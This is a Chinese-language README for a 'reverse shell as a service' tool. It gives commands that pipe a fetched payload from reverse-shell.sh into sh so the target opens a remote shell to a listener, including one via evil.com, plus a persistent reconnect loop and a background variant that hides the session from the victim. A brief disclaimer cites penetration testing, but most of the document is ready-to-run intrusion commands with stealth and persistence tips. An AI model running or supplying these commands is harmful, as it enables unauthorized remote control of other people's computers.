<div align="center">
	<br>
	<a href="https://reverse-shell.sh" target="_blank">
		<img width="128" src="favicon.ico" alt="keyv">
    </a>
</div>

# 反弹shell

> 反弹Shell即服务 - https://reverse-shell.sh

[![Coverage Status](https://coveralls.io/repos/github/lukechilds/reverse-shell/badge.svg?branch=master)](https://coveralls.io/github/lukechilds/reverse-shell?branch=master)
[![npm](https://img.shields.io/npm/v/reverse-shell.svg)](https://www.npmjs.com/package/reverse-shell)
[![GitHub Donate](https://badgen.net/badge/GitHub/Sponsor/D959A7?icon=github)](https://github.com/sponsors/lukechilds)
[![Bitcoin Donate](https://badgen.net/badge/Bitcoin/Donate/F19537?icon=bitcoin)](https://lu.ke/tip/bitcoin)
[![Lightning Donate](https://badgen.net/badge/Lightning/Donate/F6BC41?icon=bitcoin-lightning)](https://lu.ke/tip/lightning)

易于记忆的反弹Shell，应该适用于大多数Unix系统。

检测目标上的可用软件并运行适当有效的Payload。

## 用法

### 1. 监听连接

在你的计算机上，打开一个端口并监听它，你可以使用netcat轻松做到这一点。

```shell
nc -l 1337
```
### 2. 在目标上执行反弹Shell

在目标计算机上，将 https://reverse-shell.sh/yourip:port 的输出通过管道符传输到sh。

```shell
curl https://reverse-shell.sh/192.168.0.69:1337 | sh
```

回到你的机器，你现在应该有一个Shell提示符了。

### 3. 不要乱搞

这旨在用于渗透测试或帮助同事了解为什么他们应该始终锁定计算机。请不要将其用于任何恶意行为。

## 一个小Demo

<img src="https://i.imgur.com/qqjhxAw.gif" width="808">

## 小技巧

### 主机名

你可以使用主机名代替IP。

```shell
curl https://reverse-shell.sh/localhost:1337 | sh
```

### 远程连接

因为这是一个反弹连接，所以它是可以穿透防火墙并连接到互联网。

你可以在 evil.com 上侦听服务器上的连接，并通过以下命令从安全网络内部获取反向 shell：

```shell
curl https://reverse-shell.sh/evil.com:1337 | sh
```

### 重新连接（权限维持）

默认情况下，当 shell 退出时，您将失去连接。您可能会意外地使用无效的命令执行此操作。您可以轻松地创建一个 shell，该 shell 将尝试通过将其包装在 while 循环中来重新连接。

```shell
while true; do curl https://reverse-shell.sh/yourip:1337 | sh; done
```

如果你对同事这样做，要小心，如果他们离开办公室时仍然在运行，你就会让他们受到攻击。

### 作为后台进程运行

终端会话需要保持打开状态才能保持反向 shell 连接。如果你想恶作剧同事，这可能有点暴露了。

以下命令将在后台进程中运行反向 shell 并退出终端，从而在受害者的计算机上不会打开任何看起来可疑的终端窗口。

确保在新的终端窗口中运行此命令，否则您将丢失现有会话中的任何工作。

```shell
sh -c "curl https://reverse-shell.sh/localhost:1337 | sh -i &" && exit
```

## License

MIT © Luke Childs
